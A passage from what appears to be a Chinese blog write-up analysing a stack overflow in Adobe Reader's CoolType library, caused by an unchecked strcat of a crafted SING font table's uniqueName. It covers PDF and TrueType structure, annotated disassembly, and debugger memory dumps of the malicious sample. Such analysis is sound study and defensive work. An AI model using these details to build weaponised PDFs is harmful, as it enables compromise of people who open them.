locale=&quot;en_US&quot;&gt;</span><br><span class="line">    &lt;pageSet&gt;&lt;/pageSet&gt;</span><br><span class="line">    &lt;/subform&gt;&lt;/template&gt;&lt;/xdp:xdp&gt;</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">xref    //交叉引用表</span><br><span class="line">0 15    //说明下面的描述是从0号对象开始，数量为15</span><br><span class="line">0000000000 65535 f  //对象0的起始地址为00000000，产生号为65535，也是最大产生号，不可以再进行更改，f表示该对象状态为free</span><br><span class="line">0000000015 00000 n  //对象1的起始地址为00000015，产生号为00000，全零表明该对象未被修改过，n表示该对象在使用中</span><br><span class="line">0000000139 00000 n</span><br><span class="line">0000000264 00000 n</span><br><span class="line">0000000294 00000 n</span><br><span class="line">0000000332 00000 n</span><br><span class="line">0000000469 00000 n</span><br><span class="line">0000000503 00000 n</span><br><span class="line">0000000727 00000 n</span><br><span class="line">0000000853 00000 n</span><br><span class="line">0000001016 00000 n</span><br><span class="line">0000041370 00000 n</span><br><span class="line">0000041443 00000 n</span><br><span class="line">0000045816 00000 n</span><br><span class="line">0000045853 00000 n</span><br><span class="line"></span><br><span class="line">trailer     //尾部</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Size 15        //该PDF的对象数</span><br><span class="line">    /Root 1 0 R     //根对象的对象号为1</span><br><span class="line">&gt;&gt;</span><br><span class="line"></span><br><span class="line">startxref</span><br><span class="line">46280       //交叉引用表的偏移</span><br><span class="line">%%EOF       //文件结束标志</span><br></pre></td></tr></table></figure><p><code>TTF表目录头</code>结构如下：<br><img src="/resources/2018/2018-06-01-00.jpg" alt="TTF表目录头结构"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">                        表目录头</span><br><span class="line">          |￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣|</span><br><span class="line">00000000: 00 01 00 00 00 11 01 00 00 04 00 10 4F 53 2F 32  ............OS/2</span><br><span class="line"></span><br><span class="line">TrueType字体用machintosh的轮廓字体资源的格式编码，有一个唯一的标记名&quot;sfnt&quot;。</span><br></pre></td></tr></table></figure><blockquote><ul><li><strong><code>sfnt version</code></strong>：0x00010000(sfnt-1.0)</li><li><strong><code>numTables</code></strong>：0x0011(Dec:17) 有17个表</li><li><strong><code>searchRange</code></strong>：0x0100</li><li><strong><code>entrySelector</code></strong>：0x0004</li><li><strong><code>rangeShift</code></strong>：0x0010</li></ul></blockquote><p><code>TTF表目录项</code>结构如下：<br><img src="/resources/2018/2018-06-01-01.jpg" alt="TTF表目录项结构"></p><h3 id="0x32-SING表结构"><a href="#0x32-SING表结构" class="headerlink" title="0x32 SING表结构"></a>0x32 SING表结构</h3><p>&emsp;&emsp;<code>SING技术</code>是Adobe公司推出的针对<code>“外字”（Gaiji）</code>的解决方案，<code>外字</code>是<code>日语</code>中的意思，<code>中文</code>中就是<code>生僻字</code>的意思。SING允许用户创建新字形，每个新字形作为一个独立的字体打包。这样打包出来的字形称为字形包（<code>glyphlet</code>）。这种格式通过Adobe公开的，且<code>基于OpenType</code>。SING（Smart INdependent Glyphlets，智能独立字形包）的规范允许字形包随同文件一起传送，这样包含SING字符的文件也是可携带的，而又不会字符乱码、异常显示。SING表结构文档真的不好找，一篇博客中说可以在这里<a href="https://www.adobe.com/devnet/opentype/gdk/topic.html" target="_blank" rel="noopener">Adobe Glyphlet Development Kit (GDK) for SING Gaiji Architecture</a>下载到一个名叫<code>GlyDevKit.zip</code>的压缩包，压缩包中的Gaiji SING Glyphlet spec.pdf文档中记录了有关SING表的一些规范，但是，可能由于时间问题，Adobe官网已经下载不到这个压缩包了，还好有关漏洞部分的内容，他的博客中已经提到。还可以在这里找到,<a href="https://github.com/adobe-type-tools/afdko/blob/develop/c/spot/sfnt_includes/sfnt_SING.h" target="_blank" rel="noopener">Adobe Font Development Kit for OpenType</a>。</p><p><code>SING表目录项</code>的定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> struct_SING</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> tag[<span class="number">4</span>];        <span class="comment">//标记："SING"</span></span><br><span class="line">    ULONG checkSum;     <span class="comment">//校验和："0xD9BCC8B5"</span></span><br><span class="line">    ULONG offset;       <span class="comment">//表偏移："0x0000011c"</span></span><br><span class="line">    ULONG length;       <span class="comment">//数据长度："0x00001DDF"</span></span><br><span class="line">&#125;TableEntry;</span><br><span class="line"><span class="comment">//TrueType字体中的所有数据都使用big-endian编码，最高位字节在最前面（因为TrueType字体最初是由apple公司定义的，而apple公司的os运行在motorola的cpu上）。</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">000000e0: 05 47 06 3A 00 00 EB 2C 00 00 00 20 53 49 4E 47  .G.:...,... SING</span><br><span class="line">000000f0: D9 BC C8 B5 00 00 01 1C 00 00 1D DF 70 6F 73 74  ............post</span><br><span class="line"></span><br><span class="line">53 49 4E 47   D9 BC C8 B5   00 00 01 1C   00 00 1D DF</span><br></pre></td></tr></table></figure><p>下表列出了TrueType字体中常见的表:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">head           字体头                            字体的全局信息</span><br><span class="line">cmap           字符代码到图元的映射               把字符代码映射为图元索引</span><br><span class="line">glyf           图元数据                          图元轮廓定义以及网格调整指令</span><br><span class="line">maxp           最大需求表                        字体中所需内存分配情况的汇总数据</span><br><span class="line">mmtx           水平规格                          图元水平规格</span><br><span class="line">loca           位置表索引                        把元索引转换为图元的位置</span><br><span class="line">name           命名表                            版权说明、字体名、字体族名、风格名等等</span><br><span class="line">hmtx           水平布局                          字体水平布局星系：上高、下高、行间距、最大前进宽度、最小左支撑、最小右支撑</span><br><span class="line">kerm           字距调整表                        字距调整对的数组</span><br><span class="line">post           PostScript信息                    所有图元的PostScript   FontInfo目录项和PostScript名</span><br><span class="line">PCLT           PCL5数据                          HP PCL 5Printer Language的字体信息：字体数、宽度、x高度、风格、记号集等等</span><br><span class="line">OS/2           OS/2和Windows特有的规格           TrueType字体所需的规格集</span><br></pre></td></tr></table></figure><p>SING表内容的数据结构如下图所示：</p><div align="left"><img src="/resources/2018/2018-06-01-02.jpg" width="70%" height="50%" alt="SING表结构"></div><p>上面在分析PDF内容的时候已经将<code>SING表</code>和<code>SING表目录项</code>标出来了。</p><h3 id="0x33-漏洞触发"><a href="#0x33-漏洞触发" class="headerlink" title="0x33 漏洞触发"></a>0x33 漏洞触发</h3><h4 id="1、静态分析"><a href="#1、静态分析" class="headerlink" title="1、静态分析"></a>1、静态分析</h4><p>用IDA打开<code>CoolType.dll</code>库，Shift+F12打开<code>String窗口</code>，搜索<code>&quot;SING&quot;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.rdata:0819CE34 0000000C C quotesingle                               </span><br><span class="line">.rdata:0819DA2C 0000000D C missing maxp                              </span><br><span class="line">.rdata:0819DB4C 00000005 C SING                                      </span><br><span class="line">.rdata:081A6F38 00000013 C Error parsing CMap                        </span><br><span class="line">.rdata:081A6F4C 00000016 C missing codespace map</span><br></pre></td></tr></table></figure><p>双击上面的<code>第三个条目</code>，跳转到下面所示位置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.rdata:0819DB4C ; char aSing[]</span><br><span class="line">.rdata:0819DB4C aSing           db &apos;SING&apos;,0             ; DATA XREF: sub_8015AD9+D2o</span><br><span class="line">.rdata:0819DB4C                                         ; sub_803DCF9+7Bo ...</span><br></pre></td></tr></table></figure><p>用鼠标点击aString[],Ctrl+x查看<code>交叉引用</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Direction  Type  Address          Text  </span><br><span class="line">Up         o     sub_803DCF9+7B   push    offset aSing    ; &quot;SING&quot;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;双击这条就可以定位到解析存在漏洞的地方。下面就是<code>CoolType</code>库对<code>SING表</code>的解析代码，当<code>uniqueName</code>字段为超长字符串时，执行<code>strcat()</code>前未对其长度进行检测，执行<code>strcat()</code>后，会将该字段复制到固定大小的栈空间，最终<code>导致栈溢出</code>。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>0803DCF9     <span class="keyword">push</span>    <span class="built_in">ebp</span>                            <span class="comment">; 父函数ebp</span></span><br><span class="line"><span class="symbol">.text:</span>0803DCFA     <span class="keyword">sub</span>     <span class="built_in">esp</span>, <span class="number">104h</span>                      <span class="comment">; 分配栈空间0x104</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD00     <span class="keyword">lea</span>     <span class="built_in">ebp</span>, [<span class="built_in">esp</span>+<span class="number">104h</span>+uniqueName_buf] <span class="comment">; esp-4赋给ebp,而不是esp-4处的值赋给ebp,后面strcat会把执行结果保存在以ebp为起始地址的栈空间中</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD04     <span class="keyword">mov</span>     <span class="built_in">eax</span>, ___security_cookie <span class="comment">; security_cookie-&gt;eax</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD09     <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">ebp</span>                <span class="comment">; security_cookie^ebp-&gt;eax</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD0B     <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_4], <span class="built_in">eax</span>   <span class="comment">; 将和ebp异或完的security_cookie存到栈上父函数ebp之前的4字节中</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD11     <span class="keyword">push</span>    <span class="number">4Ch</span>                     <span class="comment">; __EH_prolog3_catch函数中分配栈空间的大小</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD13     <span class="keyword">mov</span>     <span class="built_in">eax</span>, offset loc_8184A54 <span class="comment">; 调用__security_check_cookie函数的代码段起始地址</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD18     <span class="keyword">call</span>    __EH_prolog3_catch      <span class="comment">; 向栈上写入SEH结构</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD1D     <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+arg_C]</span><br><span class="line"><span class="symbol">.text:</span>0803DD23     <span class="keyword">mov</span>     <span class="built_in">edi</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+arg_0]</span><br><span class="line"><span class="symbol">.text:</span>0803DD29     <span class="keyword">mov</span>     <span class="built_in">ebx</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+arg_4]</span><br><span class="line"><span class="symbol">.text:</span>0803DD2F     <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_130], <span class="built_in">edi</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD32     <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_138], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD35     <span class="keyword">call</span>    sub_804172C</span><br><span class="line"><span class="symbol">.text:</span>0803DD3A     <span class="keyword">xor</span>     <span class="built_in">esi</span>, <span class="built_in">esi</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD3C     <span class="keyword">cmp</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">edi</span>+<span class="number">8</span>], <span class="number">3</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD40 <span class="comment">;try &#123;</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD40     <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_10C], <span class="built_in">esi</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD43     <span class="keyword">jz</span>      loc_803DF00</span><br><span class="line"><span class="symbol">.text:</span>0803DD49     <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_124], <span class="built_in">esi</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD4C     <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_120], <span class="built_in">esi</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD4F     <span class="keyword">cmp</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">edi</span>+<span class="number">0Ch</span>], <span class="number">1</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD4F <span class="comment">;&#125; // starts at 803DD40</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD53 <span class="comment">;try &#123;</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD53     <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_10C], <span class="number">1</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD57     <span class="keyword">jnz</span>     loc_803DEA9</span><br><span class="line"><span class="symbol">.text:</span>0803DD5D     <span class="keyword">push</span>    offset aName    <span class="comment">; "name"</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD62     <span class="keyword">push</span>    <span class="built_in">edi</span>             <span class="comment">; int</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD63     <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_124]</span><br><span class="line"><span class="symbol">.text:</span>0803DD66     <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_119], <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD6A     <span class="keyword">call</span>    sub_80217D7</span><br><span class="line"><span class="symbol">.text:</span>0803DD6F     <span class="keyword">cmp</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_124], <span class="built_in">esi</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD72     <span class="keyword">jnz</span>     short loc_803DDDD</span><br><span class="line"><span class="symbol">.text:</span>0803DD74     <span class="keyword">push</span>    offset aSing            <span class="comment">; "SING"</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD79     <span class="keyword">push</span>    <span class="built_in">edi</span>                     <span class="comment">; 类对象指针(0x0012E718),第一个变量为dword_823A850加1之前的值。</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD7A     <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_12C] <span class="comment">; ecx为字体对象,thiscall,ecx传参</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD7D     <span class="keyword">call</span>    sub_8021B06             <span class="comment">; 解析字体对象,处理SING表</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD82     <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_12C] <span class="comment">; eax指向SING表数据</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD85     <span class="keyword">cmp</span>     <span class="built_in">eax</span>, <span class="built_in">esi</span>                <span class="comment">; 判断是否为空</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD85 <span class="comment">;&#125; // starts at 803DD53</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD87 <span class="comment">;try &#123;</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD87     <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_10C], <span class="number">2</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD8B     <span class="keyword">jz</span>      short loc_803DDC4       <span class="comment">; 这里不跳转</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD8D     <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">eax</span>]              <span class="comment">; 字体资源版本号0.1,构造样本时小端写入,这里读出就变成了ecx=0x00010000,使其可以顺利执行到strcat</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD8F     <span class="keyword">and</span>     <span class="built_in">ecx</span>, <span class="number">0FFFFh</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD95     <span class="keyword">jz</span>      short loc_803DD9F       <span class="comment">; 这里跳转，jz和je机器码是一样的，IDA识别为jz，OllyDbg识别为je，这里jz感觉好理解一点</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD97     <span class="keyword">cmp</span>     <span class="built_in">ecx</span>, <span class="number">100h</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD9D     <span class="keyword">jnz</span>     short loc_803DDC0</span><br><span class="line"><span class="symbol">.text:</span>0803DD9F</span><br><span class="line"><span class="symbol">.text:</span>0803DD9F loc_803DD9F:                <span class="comment">; CODE XREF: sub_803DCF9+9C↑j</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD9F     <span class="keyword">add</span>     <span class="built_in">eax</span>, <span class="number">10h</span>                       <span class="comment">; 相对SING表入口偏移0x10处找到uniqueName</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDA2     <span class="keyword">push</span>    <span class="built_in">eax</span>                            <span class="comment">; char *,strcat源地址入栈，也就是uniqueName起始地址</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDA3     <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+uniqueName_buf] <span class="comment">; 这里将ebp的值作为目的地址，也就是前面所分配的缓冲区的起始地址</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDA6     <span class="keyword">push</span>    <span class="built_in">eax</span>                            <span class="comment">; char *,strcat目的地址入栈</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDA7     <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+uniqueName_buf], <span class="number">0</span>   <span class="comment">; 将目标字符串赋值为NULL,空字符串</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDAB     <span class="keyword">call</span>    strcat                         <span class="comment">; 调用strcat函数，造成溢出</span></span><br></pre></td></tr></table></figure><h4 id="2、动态调试"><a href="#2、动态调试" class="headerlink" title="2、动态调试"></a>2、动态调试</h4><h5 id="2-1、sub-8021B06-函数的作用"><a href="#2-1、sub-8021B06-函数的作用" class="headerlink" title="2.1、sub_8021B06()函数的作用"></a>2.1、sub_8021B06()函数的作用</h5><blockquote><ul><li>1、打开Adobe Reader,再打开OllyDbg,<code>attach</code>上Adobe Reader进程。</li><li>2、在<code>0x0803DD74</code>下断点,运行程序。</li><li>3、观察传入的<code>参数值</code>，及其<code>内存状态</code>。</li></ul></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">1、函数执行前</span><br><span class="line">    0803DD74    68 4CDB1908     push CoolType.0819DB4C                   ; ASCII 53,&quot;ING&quot;</span><br><span class="line">    0803DD79    57              push edi</span><br><span class="line">    0803DD7A    8D4D DC         lea ecx,dword ptr ss:[ebp-0x24]</span><br><span class="line">--&gt; 0803DD7D    E8 843DFEFF     call CoolType.08021B06</span><br><span class="line"></span><br><span class="line">ecx = ebp-0x24=0x0012E4D8-0x24=0x0012E4B4</span><br><span class="line">栈上的参数:</span><br><span class="line">esp --&gt; 0012E468   0012E718</span><br><span class="line">        0012E46C   0819DB4C  ASCII 53,&quot;ING&quot;</span><br><span class="line"></span><br><span class="line">[ecx]=[0x0012E4B4]=0x04952118</span><br><span class="line">04952118  00 01 00 00 00 11 01 00 00 04 00 10 4F 53 2F 32  .......OS/2</span><br><span class="line">04952128  B4 5F F4 63 00 00 EB 70 00 00 00 56 50 43 4C 54  確鬰..雙...VPCLT</span><br><span class="line">04952138  D1 8A 5E 97 00 00 EB C8 00 00 00 36 63 6D 61 70  褗^?.肴...6cmap</span><br><span class="line">04952148  A4 C3 E8 A0 00 00 B1 6C 00 00 03 58 63 76 74 20  っ锠..眑..Xcvt</span><br><span class="line">04952158  FF D3 1D 39 00 00 1E FC 00 00 01 FC 66 70 67 6D  ?9..?.黤pgm</span><br><span class="line">04952168  E7 B4 F1 C4 00 00 26 60 00 00 00 8B 67 61 73 70  绱衲..&amp;`...媑asp</span><br><span class="line">04952178  00 07 00 07 00 01 01 48 00 00 00 0C 67 6C 79 66  ...H....glyf</span><br><span class="line">04952188  0C 74 41 CF 00 00 26 EC 00 00 8A 7E 68 64 6D 78  .tA?.&amp;?.妦hdmx</span><br><span class="line">04952198  34 F0 21 0E 00 00 EC 00 00 00 15 48 68 65 61 64  4?..?..Hhead</span><br><span class="line">049521A8  DD 84 A2 D0 00 01 01 54 00 00 00 36 68 68 65 61  輨⑿.T...6hhea</span><br><span class="line"></span><br><span class="line">2、函数执行后</span><br><span class="line">    0803DD7A    8D4D DC         lea ecx,dword ptr ss:[ebp-0x24]</span><br><span class="line">    0803DD7D    E8 843DFEFF     call CoolType.08021B06</span><br><span class="line">    0803DD82    8B45 DC         mov eax,dword ptr ss:[ebp-0x24]</span><br><span class="line">--&gt; 0803DD85    3BC6            cmp eax,esi</span><br><span class="line"></span><br><span class="line">eax=[ebp-0x24]=[0x0012E4D8-0x24]=[0x0012E4B4]=0x0495231C</span><br><span class="line"></span><br><span class="line">eax</span><br><span class="line">0495231C  00 00 01 00 01 0E 00 01 00 00 00 00 00 00 00 3A  ...........:</span><br><span class="line">0495232C  F1 B9 F1 F4 75 62 82 1D 14 A7 82 4A 0C 0C 0C 0C  窆耵ub?J....</span><br><span class="line">0495233C  AC 86 F7 B5 ED 50 17 29 5C 12 8D 01 4E 51 05 0E  瑔鞯鞵)\?NQ</span><br><span class="line">0495234C  E7 CC BC CA 6B 02 ED 81 13 36 AD 5E 45 85 DC 7D  缣际k韥6璣E呠&#125;</span><br><span class="line">0495235C  DB C2 4B 84 E8 67 8A 92 74 90 C8 3D 03 65 FE 80  勐K勮g姃t惾=e</span><br><span class="line">0495236C  4E E7 C7 42 89 8B DA 08 91 71 7A 3D 83 8E BD 60  N缜B墜?憅z=儙絗</span><br><span class="line">0495237C  AB 8F FA 53 8E F2 15 70 D8 66 BB A0 24 09 05 CD  珡鶶庲p豧粻$.</span><br><span class="line">0495238C  E6 10 AE B9 B2 E0 B8 40 91 36 FC 66 8B 7B BE C2  ?侧窣?黤媨韭</span><br><span class="line">0495239C  65 24 37 DA 2B 2C FC FA 04 89 92 95 B5 3A 22 FE  e$7?,墥暤:&quot;</span><br><span class="line">049523AC  44 BA 47 90 BD 17 78 9A 86 A8 CC 2A B1 0B FA 8F  D篏惤x殕ㄌ*?鷱</span><br><span class="line">049523BC  54 C7 4B 6D BF 1A 47 1D 33 0D 72 DC D3 8E 1E FC  T荎m?G3.r苡?</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;我们可以看到<code>sub_8021B06()</code>函数有<strong><code>三个参数</code></strong>,<strong><code>第一个参数</code></strong>是this指针,其值为PDF中<code>对象10</code>在内存中的首地址,也就是<code>字体对象</code>的指针。<strong><code>第二个参数</code></strong>edi是sub_80DD0B3()函数ebp处的一个<code>类对象的指针</code>,其<code>第一个成员变量</code>的值为dword_823A850被加1前的值(dword_823A850在sub_8024217函数中被加1),也就是0。<strong><code>第三个参数</code></strong>是“SING”字符串,sub_8021B06()函数通过在<code>字体对象</code>中匹配“SING”字符串,来获得<code>“SING”表目录项</code>,从而获得<code>“SING”表数据</code>的地址。所以,我们可以推测sub_8021B06()函数的功能为求出“SING”表数据在内存中的地址。</p><p>&emsp;&emsp;我们再来看一下参数<code>edi中的值</code>是什么,虽然其值可能不会影响我们的判断,但是为了从中学到更多的东西,还是来看一下吧。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、sub_8021B06()参数回溯,edi就是调用sub_8021B06()函数时传入的a1.</span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_80DD0B3</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, _DWORD *a5, <span class="keyword">int</span> a6)</span></span></span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line"><span 